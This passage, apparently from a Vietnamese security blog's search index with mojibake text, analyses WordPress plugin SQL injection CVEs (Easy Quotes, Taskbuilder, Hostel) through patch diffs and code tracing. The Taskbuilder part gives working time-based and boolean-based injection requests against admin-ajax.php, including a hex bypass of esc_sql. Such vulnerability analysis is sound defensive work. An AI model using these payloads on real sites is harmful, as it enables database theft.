cÃ¡ch dÃ¹ng $wpdb-\u0026gt;prepare, giÃºp Ä‘áº£m báº£o dá»¯ liá»‡u Ä‘áº§u vÃ o Ä‘Æ°á»£c kiá»ƒm soÃ¡t vÃ  an toÃ n hÆ¡n.\nKey takeaways:\nLuÃ´n sá»­ dá»¥ng $wpdb-\u0026gt;prepare() khi lÃ m viá»‡c vá»›i database trong WordPress Ä‘á»ƒ trÃ¡nh SQL Injection. ThÆ°á»ng xuyÃªn cáº­p nháº­t plugin vÃ  kiá»ƒm tra báº£o máº­t Ä‘á»ƒ trÃ¡nh trá»Ÿ thÃ nh má»¥c tiÃªu táº¥n cÃ´ng. References SQL Injection cheat sheet - PortSwigger\nWordPress Easy Quotes Plugin \u0026lt;= 1.2.2 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/vi/posts/2025-09-23-cve-2025-26943/","summary":"\u003cp\u003eLá»— há»•ng xáº£y ra trÃªn plugin \u003cstrong\u003eEasy Quotes\u003c/strong\u003e cá»§a WordPress trÆ°á»›c phiÃªn báº£n \u003cstrong\u003e1.2.3\u003c/strong\u003e. Äiá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u cá»§a báº¡n, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-26943\"\u003eCVE-2025-26943\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/easy-quotes/#description\"\u003eWordPress Easy Quotes Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.2.2\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: High (9.3)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Unauthenticated\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTaskbuilder Plugin\u003c/strong\u003e:  v1.2.2(vul) vÃ  v1.2.3(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ tháº¥y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eá»¨ng dá»¥ng Ä‘Ã£ Ä‘Æ°a trá»±c tiáº¿p dá»¯ liá»‡u tá»« ngÆ°á»i dÃ¹ng vÃ o cÃ¢u query SQL mÃ  \u003cstrong\u003ekhÃ´ng sá»­ dá»¥ng cÃ¡c biá»‡n phÃ¡p báº£o vá»‡\u003c/strong\u003e khiáº¿n lá»— há»•ng SQL Injection xáº£y ra.\u003c/p\u003e","title":"CVE-2025-26943"},{"content":"Lá»— há»•ng xáº£y ra trÃªn plugin Taskbuilder cá»§a WordPress trÆ°á»›c phiÃªn báº£n 4.0.2. Äiá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u cá»§a báº¡n, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\nCVE ID: CVE-2025-39569 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt; 4.0.2 CVSS severity: High (8.5) Required Privilege: Subscriber Requirements Local WordPress and Debugging Taskbuilder Plugin: v4.0.1(vul) vÃ  v4.0.2(fix) diff tool: meld hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ tháº¥y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version Analysis á»¨ng dá»¥ng Ä‘Ã£ xá»­ lÃ½ dá»¯ liá»‡u Ä‘áº§u vÃ o trÆ°á»›c khi Ä‘Æ°a vÃ o cÃ¢u SQL. Tuy nhiÃªn, trong quÃ¡ trÃ¬nh xÃ¢y dá»±ng truy váº¥n, giÃ¡ trá»‹ nÃ y Ä‘Æ°á»£c chÃ¨n trá»±c tiáº¿p mÃ  khÃ´ng Ä‘Æ°á»£c bao trong dáº¥u nhÃ¡y Ä‘Æ¡n '...'. Äiá»u Ä‘Ã³ khiáº¿n káº» táº¥n cÃ´ng cÃ³ thá»ƒ chÃ¨n thÃªm cÃ¡c thÃ nh pháº§n cÃº phÃ¡p SQL há»£p lá»‡ (nhÆ° OR, AND,...) vÃ o truy váº¥n, dáº«n Ä‘áº¿n lá»— há»•ng SQL Injection.\nPatch Diff DÃ¹ng diff tool báº¥t kÃ¬ Ä‘á»ƒ so sÃ¡nh sá»± khÃ¡c biá»‡t giá»¯a báº£n lá»—i vÃ  báº£n vÃ¡. CÃ³ sá»± khÃ¡c biá»‡t rÃµ á»Ÿ file includes/admin/projects/get_users.php\nTrong phiÃªn báº£n v4.0.1, biáº¿n $proj_id sau khi escape Ä‘Æ°á»£c Ä‘Æ°a tháº³ng vÃ o cÃ¢u truy váº¥n mÃ  khÃ´ng cÃ³ dáº¥u nhÃ¡y Ä‘Æ¡n bao quanh:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = $proj_id\u0026#34; ); á» báº£n v4.0.2, truy váº¥n Ä‘Ã£ Ä‘Æ°á»£c Ä‘iá»u chá»‰nh báº±ng cÃ¡ch Ä‘áº·t $proj_id trong dáº¥u nhÃ¡y Ä‘Æ¡n sau khi escape:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = \u0026#39;$proj_id\u0026#39;\u0026#34; ); Báº£n vÃ¡ nÃ y Ä‘áº£m báº£o ráº±ng giÃ¡ trá»‹ $proj_id sau khi escape Ä‘Æ°á»£c coi lÃ  má»™t chuá»—i literal, khÃ´ng thá»ƒ thoÃ¡t ra khá»i dáº¥u nhÃ¡y Ä‘Æ¡n Ä‘á»ƒ chÃ¨n thÃªm cÃº phÃ¡p SQL, qua Ä‘Ã³ ngÄƒn cháº·n táº¥n cÃ´ng SQL Injection.\nHow it work? File architecture:\nCáº¥u trÃºc chung cá»§a file hiá»‡n táº¡i\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project WHERE id = $proj_id\u0026#34;); // Báº¯t Ä‘áº§u buffer Ä‘á»ƒ táº¡o ná»™i dung chÃ­nh (body) cá»§a modal ob_start(); // ... render HTML danh sÃ¡ch users $body = ob_get_clean(); // Báº¯t Ä‘áº§u buffer Ä‘á»ƒ táº¡o pháº§n footer cá»§a modal ob_start(); // ... render HTML cÃ¡c nÃºt thao tÃ¡c (Close, Save) $footer = ob_get_clean(); // Tráº£ dá»¯ liá»‡u JSON Ä‘á»ƒ frontend hiá»ƒn thá»‹ modal echo json_encode([ \u0026#39;body\u0026#39; =\u0026gt; $body, \u0026#39;footer\u0026#39; =\u0026gt; $footer, ]); $proj_id / $project: Láº¥y dá»¯ liá»‡u project tá»« database. ob_start() / ob_get_clean(): Ghi HTML ra buffer thay vÃ¬ xuáº¥t trá»±c tiáº¿p, giÃºp gom ná»™i dung vÃ o biáº¿n. $body / $footer: Chá»©a ná»™i dung HTML Ä‘á»™ng cá»§a modal. json_encode(): Tráº£ JSON cho client, cÃ³ kháº£ nÄƒng Ä‘Æ°á»£c sá»­ dá»¥ng trong Ajax Ä‘á»ƒ hiá»ƒn thá»‹ modal mÃ  khÃ´ng cáº§n refresh trang. File náº±m trong thÆ° má»¥c includes cho tháº¥y ráº±ng nÃ³ sáº½ Ä‘Æ°á»£c gá»i á»Ÿ 1 chá»©c nÄƒng nÃ o Ä‘Ã³ á»Ÿ nÆ¡i khÃ¡c. Äá»ƒ biáº¿t chá»©c nÄƒng nÃ o sá»­ dá»¥ng nÃ³, ta tÃ¬m kiáº¿m vá»›i tá»« khÃ³a get_users.php trong thÆ° má»¥c chá»©a plugin.\nğŸ‘‰ NÃ³ Ä‘Æ°á»£c include trong hÃ m wppm_get_users() cá»§a class WPPM_Admin trong file class-wppm-admin.php. wppm_get_users() lÃ  callback cá»§a action hook trong WordPress.\nWPPM_Admin construct:\nfinal class WPPM_Admin { // constructor public function __construct() { // other action add_action( \u0026#39;wp_ajax_wppm_get_users\u0026#39;,array($this,\u0026#39;wppm_get_users\u0026#39;)); // array($this,\u0026#39;wppm_get_users\u0026#39;)) = $this::wppm_get_users() // other action } } add_action() lÃ  má»™t Plugin API cá»§a WordPress, cho phÃ©p gáº¯n má»™t callback vÃ o má»™t action hook. wp_ajax_wppm_get_users lÃ  tÃªn hook Ajax, vá»›i quy táº¯c Ä‘áº·t tÃªn: wp_ajax_{action} =\u0026gt; Xá»­ lÃ½ Ajax khi user Ä‘Ã£ Ä‘Äƒng nháº­p. wp_ajax_nopriv_{action} =\u0026gt; Xá»­ lÃ½ Ajax khi user chÆ°a Ä‘Äƒng nháº­p. á» Ä‘Ã¢y, action = wppm_get_users. NghÄ©a lÃ  náº¿u trong Ajax request báº¡n gá»­i action=wppm_get_users tá»›i admin-ajax.php, thÃ¬ WordPress sáº½ tÃ¬m callback tÆ°Æ¡ng á»©ng Ä‘á»ƒ xá»­ lÃ½, á»Ÿ Ä‘Ã¢y lÃ  wppm_get_users(). ğŸ‘‰ Ta Ä‘Ã£ biáº¿t Ä‘Æ°á»£c action = wppm_get_users, kiá»ƒm tra xem Ajax nÃ o sá»­ dá»¥ng action nÃ y báº±ng cÃ¡ch tÃ¬m tá»« khÃ³a wppm_get_users trÃªn cÃ¡c file .js trong thÆ° má»¥c chá»©a plugin.\nAction wppm_get_users lÃ  pháº§n data trong request POST cá»§a hÃ m wppm_get_users()\nHÃ m wppm_get_users() sáº½ Ä‘Æ°á»£c Ä‘áº·t trong HTML attribute cá»§a chá»©c nÄƒng project\nTáº¡o project má»›i Truy cáº­p vÃ o project Ä‘Ã³ Inspect code vÃ  tÃ¬m hÃ m wppm_get_users sáº½ Ä‘Æ°á»£c Ä‘áº·t á»Ÿ Ä‘Ã¢u, hÃ nh Ä‘á»™ng nÃ o sáº½ gá»i nÃ³ ğŸ‘‰ Khi click vÃ o icon bÃªn cáº¡nh Users ajax sáº½ hoáº¡t Ä‘á»™ng, gá»­i request Ä‘áº¿n server, láº¥y danh sÃ¡ch cÃ¡c user tham gia project vÃ  mÃ£ HTML hiá»ƒn thá»‹ nÃ³.\nExploit Detect SQLi Báº¯t request báº±ng BurpSuite, gá»­i request vá»›i SQLi payload time base\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+SLEEP(1)) Thá»i gian pháº£n há»“i bá»‹ delay =\u0026gt; SQL Injection thÃ nh cÃ´ng.\nGet First Letter of Database Name Äiá»u kiá»‡n tiÃªn quyáº¿t Ä‘á»ƒ dump Ä‘Æ°á»£c háº¿t data lÃ  pháº£i dump Ä‘Æ°á»£c 1 kÃ½ tá»± báº¥t ká»³ cá»§a tÃªn database, náº¿u láº¥y Ä‘Æ°á»£c thÃ¬ toÃ n bá»™ data Ä‘á»u dump Ä‘Æ°á»£c.\nGá»­i request vá»›i SQLi payload boolean base vÃ³i proj_id Ä‘Ãºng:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,4,999)) Database name Ä‘Æ°á»£c tÃ´i Ä‘áº·t tÃªn lÃ  wordpress nÃªn kÃ­ tá»± Ä‘áº§u tiÃªn lÃ  w tÆ°Æ¡ng á»©ng vá»›i mÃ£ HEX lÃ  0x77\nSá»­ dá»¥ng SUBSTRING(STRING,1,1) Ä‘á»ƒ láº¥y kÃ­ tá»± Ä‘áº§u tiÃªn cá»§a chuá»—i\ná» Ä‘Ã¢y, $proj_id báº±ng 4 vÃ¬ SUBSTRING('wordpress',1,1)=0x77 lÃ  Ä‘Ãºng nÃªn SELECT láº¥y giÃ¡ trá»‹ Ä‘Ãºng trong IF(condition, value if true, value if false), 4 lÃ  giÃ¡ trá»‹ cÃ³ thá»±c trong database, nÃªn response tráº£ vá» chá»©a danh sÃ¡ch ngÆ°á»i tham gia dá»± Ã¡n\nSá»­ dá»¥ng HEX technique Ä‘á»ƒ bypass hÃ m esc_sql() á»Ÿ trÃªn, dÃ¹ng Ä‘á»ƒ so sÃ¡nh khi khÃ´ng sá»­ dÃ¹ng Ä‘Æ°á»£c '\nGá»­i request vá»›i SQLi payload boolean base vÃ³i proj_id sai:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,999,4)) Vá»›i proj_id khÃ´ng cÃ³ thá»±c trong database, response sáº½ tráº£ vá» káº¿t quáº£ chá»©a None\nğŸ‘‰ Ta Ä‘Ã£ láº¥y Ä‘Æ°á»£c kÃ­ tá»± Ä‘áº§u tiÃªn cá»§a database name báº±ng ká»¹ thuáº­t boolean base\nproj_id Ä‘Ã¹ng: response khÃ´ng chá»©a None proj_id sai: response chá»©a None CÃ³ thá»ƒ sá»­ dá»¥ng ká»¹ thuáº­t time base nhÆ°ng khi dump sá»‘ lÆ°á»£ng lá»›n data, thá»i gian dump sáº½ ráº¥t lÃ¢u\nConclusion Lá»— há»•ng CVE-2025-39569 trong plugin WordPress Taskbuilder xuáº¥t phÃ¡t tá»« viá»‡c thiáº¿u dáº¥u nhÃ¡y Ä‘Æ¡n '...' bao quanh dá»¯ liá»‡u Ä‘áº§u vÃ o trong cÃ¢u lá»‡nh SQL, khiáº¿n dá»¯ liá»‡u ngÆ°á»i dÃ¹ng cÃ³ thá»ƒ Ä‘Æ°á»£c diá»…n giáº£i nhÆ° má»™t pháº§n cá»§a cÃ¢u lá»‡nh SQL há»£p lá»‡.\nBáº£n vÃ¡ á»Ÿ phiÃªn báº£n 4.0.2 Ä‘Ã£ kháº¯c phá»¥c váº¥n Ä‘á» báº±ng cÃ¡ch Ä‘Æ°a $proj_id vÃ o trong '...', Ä‘áº£m báº£o nÃ³ luÃ´n Ä‘Æ°á»£c xá»­ lÃ½ nhÆ° má»™t literal string trong SQL.\nKey takeaways:\nÆ¯u tiÃªn sá»­ dá»¥ng prepared statements ($wpdb-\u0026gt;prepare() trong WordPress) thay vÃ¬ tá»± chÃ¨n dá»¯ liá»‡u vÃ o query. Äá»‘i vá»›i cÃ¡c plugin WordPress, cáº§n test ká»¹ lÆ°á»¡ng cÃ¡c Ajax endpoint vÃ¬ Ä‘Ã¢y lÃ  nÆ¡i dá»… xuáº¥t hiá»‡n SQLi vÃ  XSS nháº¥t. NgÆ°á»i quáº£n trá»‹ cáº§n thÆ°á»ng xuyÃªn cáº­p nháº­t plugin/theme Ä‘á»ƒ nháº­n báº£n vÃ¡ ká»‹p thá»i. References SQL Injection cheat sheet - PortSwigger\nWordPress Taskbuilder project mnagement tool Plugin \u0026lt;= 4.0.1 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/vi/posts/2025-09-22-cve-2025-39569/","summary":"\u003cp\u003eLá»— há»•ng xáº£y ra trÃªn plugin \u003cstrong\u003eTaskbuilder\u003c/strong\u003e cá»§a WordPress trÆ°á»›c phiÃªn báº£n \u003cstrong\u003e4.0.2\u003c/strong\u003e. Äiá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u cá»§a báº¡n, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39569\"\u003eCVE-2025-39569\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/taskbuilder/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt; 4.0.2\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: High (8.5)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Subscriber\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTaskbuilder Plugin\u003c/strong\u003e:  v4.0.1(vul) vÃ  v4.0.2(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ tháº¥y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eá»¨ng dá»¥ng Ä‘Ã£ \u003cstrong\u003exá»­ lÃ½ dá»¯ liá»‡u Ä‘áº§u vÃ o\u003c/strong\u003e trÆ°á»›c khi Ä‘Æ°a vÃ o cÃ¢u SQL. Tuy nhiÃªn, trong quÃ¡ trÃ¬nh xÃ¢y dá»±ng truy váº¥n, giÃ¡ trá»‹ nÃ y Ä‘Æ°á»£c chÃ¨n trá»±c tiáº¿p mÃ  khÃ´ng Ä‘Æ°á»£c bao trong dáº¥u nhÃ¡y Ä‘Æ¡n \u003ccode\u003e'...'\u003c/code\u003e. Äiá»u Ä‘Ã³ khiáº¿n káº» táº¥n cÃ´ng cÃ³ thá»ƒ chÃ¨n thÃªm cÃ¡c thÃ nh pháº§n cÃº phÃ¡p SQL há»£p lá»‡ (nhÆ° \u003ccode\u003eOR\u003c/code\u003e, \u003ccode\u003eAND\u003c/code\u003e,\u003ccode\u003e...\u003c/code\u003e) vÃ o truy váº¥n, dáº«n Ä‘áº¿n lá»— há»•ng SQL Injection.\u003c/p\u003e","title":"CVE-2025-39569 Analysis \u0026 POC"},{"content":"Lá»— há»•ng trong plugin Hostel trÆ°á»›c phiÃªn báº£n 1.1.5.7. Do viá»‡c lÃ m sáº¡ch dá»¯ liá»‡u khÃ´ng Ä‘Ãºng cÃ¡ch, Ä‘iá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\nCVE ID: CVE-2025-39566 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.1.5.6 CVSS severity: 7.6 (High) Required Privilege: Administrator Requirements Local WordPress and Debugging Hostel Plugin: v1.1.5.6(vul) vÃ  v1.1.5.7(fix) diff tool: meld hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ thÃ¡y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version Analysis NguyÃªn nhÃ¢n cá»‘ lÃµi do á»©ng dá»¥ng chÃ¨n trá»±c tiáº¿p dá»¯ liá»‡u tá»« GET request vÃ o SQL query mÃ  cÆ¡ cháº¿ kiá»ƒm soÃ¡t khÃ´ng cháº·t cháº½.\nPatch Diff DÃ¹ng diff tool báº¥t kÃ¬ Ä‘á»ƒ so sÃ¡nh sá»± khÃ¡c biá»‡t giá»¯a báº£n lá»—i vÃ  báº£n vÃ¡. CÃ³ sá»± khÃ¡c biá»‡t rÃµ á»Ÿ file controllers/bookings.php\nBáº£n lá»— há»•ng:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } Báº£n vÃ¡:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) { $ob = sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]); if(!in_array($ob, [\u0026#39;tB.id\u0026#39;, \u0026#39;tB.contact_name\u0026#39;, \u0026#39;tB.contact_email\u0026#39;, \u0026#39;tB.from_date\u0026#39;, \u0026#39;tB.amount_paid\u0026#39;, \u0026#39;tB.status\u0026#39;])) { $ob = \u0026#39;tB.id\u0026#39;; } $orderby = \u0026#34;ORDER BY $ob $dir\u0026#34;; } ğŸ‘‰ Báº£n vÃ¡ sá»­ dá»¥ng whitelist Ä‘á»ƒ giá»›i háº¡n cÃ¡c cá»™t cÃ³ thá»ƒ Ä‘Æ°á»£c sáº¯p xáº¿p, náº¿u khÃ´ng há»£p lá»‡ tráº£ vá» 'tB.id'.\nAnalysis: Lá»— há»•ng xuáº¥t hiá»‡n khi param ob Ä‘Æ°á»£c truyá»n trá»±c tiáº¿p vÃ o má»‡nh Ä‘á» ORDER BY thÃ´ng qua hÃ m sanitize_text_field(), chá»‰ escape mÃ  khÃ´ng filter SQLi.\nHow it work? Äá»ƒ inject Ä‘Æ°á»£c, ta cáº§n pháº£i xÃ¡c Ä‘á»‹nh toÃ n bá»™ cÃ¢u query Ä‘Æ°á»£c Ä‘Æ°á»£c sá»­ dá»¥ng á»Ÿ Ä‘Ã¢y\n$bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); CÃ¢u query náº±m trong nhÃ¡nh default cá»§a cáº¥u trÃºc switch.\nToÃ n bá»™ Ä‘oáº¡n xá»­ lÃ½ naá»³ thuá»™c vá» hÃ m static manage() cá»§a class WPHostelBookings.\nclass WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET[\u0026#39;do\u0026#39;]) { case \u0026#39;add\u0026#39;: // add handle break; case \u0026#39;edit\u0026#39;: // edit handle break; // view/print booking details. Will allow also to confirm/cancel case \u0026#39;view\u0026#39;: // view handle\tbreak;\t// list bookings default: // another logic if(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } $bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); // another logic break; } } } Trong WordPress, plugin giao tiáº¿p vá»›i core thÃ´ng qua Plugin API (Hook System). Do Ä‘Ã³, Ä‘á»ƒ xÃ¡c Ä‘á»‹nh nÆ¡i hÃ m manage() Ä‘Æ°á»£c gá»i, ta cÃ³ thá»ƒ tÃ¬m kiáº¿m tá»« khÃ³a \u0026quot;manage\u0026quot; trong thÆ° má»¥c chá»©a plugin.\nTrong file models/hostel.php ta cÃ³ hÃ m:\nclass class WPHostel { // another logic static function menu() { // we use \u0026#39;hostelpro_manage\u0026#39; for consistency with the pro version $wphostel_caps = current_user_can(\u0026#39;manage_options\u0026#39;) ? \u0026#39;manage_options\u0026#39; : \u0026#39;hostelpro_manage\u0026#39;; add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_rooms\u0026#39;, array(\u0026#39;WPHostelRooms\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_unavailable\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;unavailable\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_emaillog\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;email_log\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_help\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;index\u0026#34;)); } // another logic } á» Ä‘Ã¢y:\nadd_menu_page() táº¡o menu chÃ­nh trong Admin Dashboard. add_submenu_page() thÃªm cÃ¡c submenu con cho menu Ä‘Ã³. Tham sá»‘ $callback lÃ  má»™t callback function sáº½ Ä‘Æ°á»£c gá»i khi ngÆ°á»i dÃ¹ng click vÃ o menu/submenu. VÃ­ dá»¥:\n// add_menu_page($page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;, $icon_url = \u0026#39;\u0026#39;, $position = null); add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); // add_submenu_page($parent_slug, $page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); // array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); =\u0026gt; WPHostelBookings::manage() Táº¥t cáº£ menu/submenu nÃ y Ä‘á»u Ä‘Æ°á»£c Ä‘Äƒng kÃ½ bÃªn trong hÃ m static menu() cá»§a class WPHostel. Do Ä‘Ã³, Ä‘á»ƒ xÃ¡c Ä‘á»‹nh nÆ¡i hÃ m menu() Ä‘Æ°á»£c gá»i, ta cÃ³ 